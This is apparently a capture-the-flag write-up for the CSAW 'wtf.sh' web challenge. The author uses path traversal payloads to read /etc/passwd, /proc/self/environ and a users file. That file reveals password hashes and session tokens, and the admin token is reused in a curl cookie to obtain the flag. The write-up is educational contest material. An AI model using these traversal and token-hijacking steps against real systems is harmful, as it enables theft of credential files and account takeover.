Challenge: http://web.chal.csaw.io:8001/ <br>
I registered my account Etrama and have a link: http://web.chal.csaw.io:8001/profile.wtf?user=aXMh8 <br>
I tried to attack some where then found http://web.chal.csaw.io:8001/profile.wtf?user=../../aXMh8 <br>
Wew, new idea. http://web.chal.csaw.io:8001/profile.wtf?user=../../../../../../etc/passwd => success <br>
Let check the enviroment: http://web.chal.csaw.io:8001/profile.wtf?user=../../../../../../proc/self/environ => path is: /tmp/wtf_runtime/wtf.sh/ <br>

But i can get information of all users on profile.wtf?user=../../../../../../tmp/wtf_runtime/wtf.sh/users <br>

Let try another way. I created a post and have a link: http://web.chal.csaw.io:8001/post.wtf?post=EIedO <br>
Let do it again: http://web.chal.csaw.io:8001/post.wtf?post=../../../../../../tmp/wtf_runtime/wtf.sh/users <br>
Wow, it list all user: <br>
```
Posted by Acid Burn
cf45d70f9bdb54391a9ac88f2cd547bceec8e6ab
SwJMhklbaNTESIjfxs1OXG8X2+OwhxLg7D8eMo6HXENTuh21VGgSQDjxUlLoZmKWl7w2m7S2hadc0pYGfev9Lw==
Posted by Neo
4e31381620ef61ee0dbd8ef4060129c92dd8bd75
A4j4tZsB2q+RiUNrFwhqw/jUVn2hgD1MNIuGzoj1nlkXvIrFSsgEoJDnyng7IsIBSQM6MtTZg39Ld5sx3oHdnA==
Posted by The Plague
3bbc9c6c13623086031acf000ccc517c2fc4aeee
d/t4trsgbJ0Q0KIXTpsTVhAS7PrjVqbbUVxMSE+ol4Qp6K+xOmEozQ7Co4/BGqXDm/fcYK/vm4K2ujtZYw+ZqQ==
Posted by The Laughing Man
8643737572a192ce15701fadf063a0b7e1d35f61
PXCM2ORmTNrFnUlhU6LXVPOXmzBLGF4XAb32FQulIOTqxVEEq6nQyfk5dF0VflG2t4qFLUhRYh1S1Nxg6l/vhQ==
Posted by Hackerman
5f589f2d3b7639db16d9148baa441570673d050c
5w+zmn+/2kEkXU11cWTqUoEppGGhdydCGUhq8oHmbYY5fpZhYQgmxHCwGaFdo6DHYpsAgZ45mvt/VzeONMDwpg==
Posted by Morpheus
5daa999772ce52c15694dfd16edd6bc130bea5fc
8Ho5dw0S4IZV1X50HJ4vY5aluEb1mSGoiLqqzPXXU9kBw05GaXeQyQaPyF6VDJN/5QxtKmUmHURQaRVQ8RLlSw==
Posted by admin
3f0b1ebe20e3682b1a5d701590ad76fb051d3a08
ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==
Posted by Phantom Phreak
feee3b8a0d764b81404a0e9eb0b5ae8d750de411
4tV3v4Sql5T1Ynorf/eiNrnugH0VQPmbsQOqhp5EwktQtKK8VMFrM0QE/SNk+mnKeid2L9CgXMqqLifuDdTXvQ==
Posted by Trinity
2079d029c1f22f1c4c6a4b47f4d3d0a581badd01
RYrFTRbFRTZhplFABj98E3VAAPyXH4sd33KTJFNANh4Avj7QCYbFQEPGap2FCOvurthiKFrUcUrS7GaLPWd13g==
Posted by Cereal Killer
6df0f446aa743d4a6910113a11629973fa320349
UcqXnJJ9RaVxQ9xk1EcLQ5aXu2v84/pgd6UjIyd2qNYXKYyJlpNrSMtWRqqDbEfRnEVvms2qY+N5CxzLFKW1fg==
Posted by The Puppet Master
46bd2c4d48bdbba6d9e0323c4a1fb7fae17db776
EIeoPnCf8inJCWjC0tEYbfQfAl1GzYrI67GjQXQQ2Y9jEPimfXFJGrATdwXUg5WXIwWNKAUH5OBKd3Gn3VNDFg==
Posted by Zero Cool
2ebd8e0fd3a035f6eeda17f2598ce6115fd52ebb
FADs3TTAF5XG30ZGgx+A3o1+MPjLC6j+2FORNFyPwU1wckQjELcoLeu2Qv7Sbu3A8CHY/aC4DOhqErl4jlxVbQ==
```
It also have a link of profile, i check a admin's profile on: http://web.chal.csaw.io:8001/profile.wtf?user=QNI5P <br>
But only see admin's post.  <br>
Check the header and i found: ```Cookie:__cfduid=ddca4613a2a4d239e59806466a5df97f91473995542; _ga=GA1.2.650890523.1473995641; gsScrollPos=; USERNAME=Etrama; TOKEN=OlgsgOTNAlESZrx5etE98Ceh4eMILEingHuAwPrJ2638tXfYBXE1/gfClFZ1EigBLWadMjN3Gduga0/9t6kQgg==``` <br>
It still in my account. But i have a TOKEN of admin by: http://web.chal.csaw.io:8001/post.wtf?post=../../../../../../tmp/wtf_runtime/wtf.sh/users <br>
Let change it: ```curl 'http://web.chal.csaw.io:8001/profile.wtf?user=QNI5P' -H 'Host: web.chal.csaw.io:8001' -H 'Cookie: __cfduid=ddca4613a2a4d239e59806466a5df97f91473995542; _ga=GA1.2.650890523.1473995641; gsScrollPos=; USERNAME=admin; TOKEN=ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw=='``` <br>

Yeah: Flag: flag{l00k_at_m3_I_am_th3_4dm1n_n0w}
